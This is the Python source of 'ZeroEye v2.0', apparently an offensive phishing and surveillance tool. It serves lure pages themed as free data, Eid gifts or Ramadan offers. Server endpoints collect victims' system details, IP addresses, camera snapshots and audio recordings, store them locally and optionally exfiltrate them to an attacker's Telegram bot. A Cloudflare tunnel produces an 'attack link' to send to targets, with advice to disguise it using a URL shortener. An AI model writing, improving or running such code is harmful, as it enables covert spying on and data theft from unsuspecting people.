import os
import sys
import json
import time
import shutil
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.table import Table

from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

console = Console()
app = FastAPI(docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

# Ensure directories exist
if not os.path.exists("static"): os.makedirs("static")
if not os.path.exists("captured"): os.makedirs("captured")
if not os.path.exists("templates"): os.makedirs("templates")

app.mount("/static", StaticFiles(directory="static"), name="static")

CONFIG_FILE = "config.json"
CONFIG = {
    "telegram_enabled": False, 
    "bot_token": "", 
    "chat_id": "", 
    "template": "free_data"
}
bot = None

# --- CONFIG MANAGEMENT ---
def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            console.print(f"[red][!] Error loading config: {e}[/red]")
            return None
    return None

def save_config(conf):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(conf, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red][!] Error saving config: {e}[/red]")
        return False

def delete_config():
    """Delete configuration file"""
    try:
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            return True
    except:
        pass
    return False

def save_local(filename, data):
    """Save data to local file"""
    try:
        with open(f"captured/{filename}", "a", encoding='utf-8') as f:
            f.write(f"\n--- {time.ctime()} ---\n{data}\n")
    except Exception as e:
        console.print(f"[red][!] Error saving local file: {e}[/red]")

# --- FASTAPI ROUTES ---
@app.get("/")
async def serve_index():
    path = f"templates/{CONFIG['template']}.html"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: 
            return HTMLResponse(f.read())
    return HTMLResponse("<h1>Error: Template not found</h1>")

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    try:
        info = json.loads(data)
        log_msg = f"🎯 SYSTEM HIT:\n{json.dumps(info, indent=2)}"
        console.print(f"[green][+] System Info Received[/green]")
        if bot: 
            bot.send_message(log_msg)
        save_local("system_info.txt", log_msg)
        return {"status": "ok"}
    except Exception as e:
        console.print(f"[red][!] Error processing system info: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    try:
        info = json.loads(data)
        ip_addr = info.get('internal_ip', 'Unknown')
        msg = f"🌐 IP LEAK: {ip_addr}"
        console.print(f"[green][+] IP Address Received: {ip_addr}[/green]")
        if bot: 
            bot.send_message(msg)
        save_local("ip_log.txt", f"IP: {ip_addr}")
        return {"status": "ok"}
    except Exception as e:
        console.print(f"[red][!] Error processing IP info: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    try:
        filename = f"captured/cam_{int(time.time())}.jpg"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        console.print("[green][+] Camera Shot Received[/green]")
        if bot: 
            bot.send_photo(filename, caption="📸 Camera Capture")
        return {"status": "ok"}
    except Exception as e:
        console.print(f"[red][!] Error processing camera shot: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_audio")
async def receive_audio(file: UploadFile = File(...)):
    try:
        filename = f"captured/audio_{int(time.time())}.wav"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        console.print("[cyan][+] Audio Clip Received[/cyan]")
        if bot: 
            bot.send_audio(filename, caption="🎤 Audio Recording")
        return {"status": "ok"}
    except Exception as e:
        console.print(f"[red][!] Error processing audio: {e}[/red]")
        return {"status": "error"}

# --- WIZARD INTERFACE ---
def start_wizard():
    console.clear()
    console.print(get_banner())
    
    # Config persistence logic
    saved_conf = load_config()
    global bot, CONFIG
    
    if saved_conf:
        console.print("\n[cyan]📁 Found saved configuration[/cyan]")
        
        # Create a table to show saved settings
        table = Table(show_header=False, box=None)
        table.add_column("Setting", style="cyan")
        table.add_column("Value", style="white")
        
        token_preview = saved_conf['bot_token'][:8] + "..." if saved_conf['bot_token'] else "Not set"
        table.add_row("Bot Token", token_preview)
        table.add_row("Chat ID", saved_conf['chat_id'] or "Not set")
        table.add_row("Template", saved_conf['template'])
        table.add_row("Telegram", "✅ Enabled" if saved_conf['telegram_enabled'] else "❌ Disabled")
        
        console.print(table)
        
        choice = Prompt.ask(
            "Use saved settings?", 
            choices=["y", "n", "delete"], 
            default="y"
        )
        
        if choice == "y":
            CONFIG.update(saved_conf)
            if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        elif choice == "delete":
            if delete_config():
                console.print("[green][✓] Configuration deleted[/green]")
            saved_conf = None
        else:
            saved_conf = None  # Force re-entry

    # Telegram setup (if no saved config or user chose to re-enter)
    if not saved_conf:
        console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
        if Confirm.ask("Enable Telegram exfiltration?", default=True):
            CONFIG["telegram_enabled"] = True
            CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
            CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
            
            # Test the configuration
            test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
            if Confirm.ask("Save these settings for future use?", default=True):
                if save_config(CONFIG):
                    console.print("[green][✓] Configuration saved[/green]")
                else:
                    console.print("[red][!] Failed to save configuration[/red]")
            
            bot = test_bot
        else:
            CONFIG["telegram_enabled"] = False
            CONFIG["bot_token"] = ""
            CONFIG["chat_id"] = ""
    
    # Template selection
    console.print("\n[bold cyan]🎨 Select Template[/bold cyan]")
    templates = {
        "1": ("Free Data", "free_data"),
        "2": ("Eid Gift", "eid"), 
        "3": ("Ramadan", "ramadan")
    }
    
    for key, (name, _) in templates.items():
        console.print(f"  {key}. {name}")
    
    choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
    CONFIG["template"] = templates[choice][1]
    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")

    # Start server and tunnel
    port = 8080
    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
    
    tunnel = TunnelManager(port)
    url = tunnel.start_cloudflared()
    
    # Display final attack panel
    console.print(Panel(
        f"[bold cyan]🎯 ATTACK LINK READY[/bold cyan]\n\n"
        f"[bold green]{url}[/bold green]\n\n"
        f"[yellow]📋 Copy this link and send it to your target[/yellow]\n"
        f"[grey50]💡 Tip: Use a URL shortener (bit.ly) to mask the link![/grey50]",
        title="ZeroEye v2.0 - Ready",
        border_style="green",
        expand=False
    ))
    
    console.print("\n[cyan]🛡️  Server is running... Press Ctrl+C to stop[/cyan]")
    
    try:
        uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Server error: {e}[/red]")

if __name__ == "__main__":
    start_wizard()
